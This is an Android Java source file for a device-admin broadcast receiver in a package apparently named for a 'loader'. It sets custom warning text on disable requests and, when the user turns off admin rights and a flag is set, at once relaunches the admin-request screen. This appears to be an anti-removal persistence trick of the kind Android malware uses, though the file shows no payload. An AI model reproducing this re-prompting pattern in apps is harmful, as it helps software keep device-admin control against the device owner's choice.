/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package task.loader.admin;

import java.util.concurrent.atomic.AtomicBoolean;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import task.loader.Constants;
import task.loader.Settings;

public class AdminReceiver extends BroadcastReceiver 
{
	public static AtomicBoolean repeatRequest = new AtomicBoolean(false);
	
    public static final class actions
    {
        public static final String ADMIN_ENABLED = "android.app.action.DEVICE_ADMIN_ENABLED";
        public static final String ADMIN_DISABLED = "android.app.action.DEVICE_ADMIN_DISABLED";
        public static final String ADMIN_DISABLE_REQUESTED = "android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED";
    }

    @Override
    public void onReceive(Context context, Intent intent) 
    {
        String action = intent.getAction();
        
        if(Constants.DEBUG) Settings.debug(getClass().getName() + "::onReceive(): action = " + action);
        
        if(action.equals(actions.ADMIN_ENABLED))
        {
            
        }
        else if(action.equals(actions.ADMIN_DISABLE_REQUESTED))
        {
            Bundle extras = getResultExtras(true);
            extras.putCharSequence("android.app.extra.DISABLE_WARNING", Constants.ADMIN_TEXT_DISABLE_REQUEST);
        }
        else if(action.equals(actions.ADMIN_DISABLED))
        {
        	if(repeatRequest.get())
        	{
                Admin.startAdminActivity(context);
        	}
        }
    }
    
    

    
}
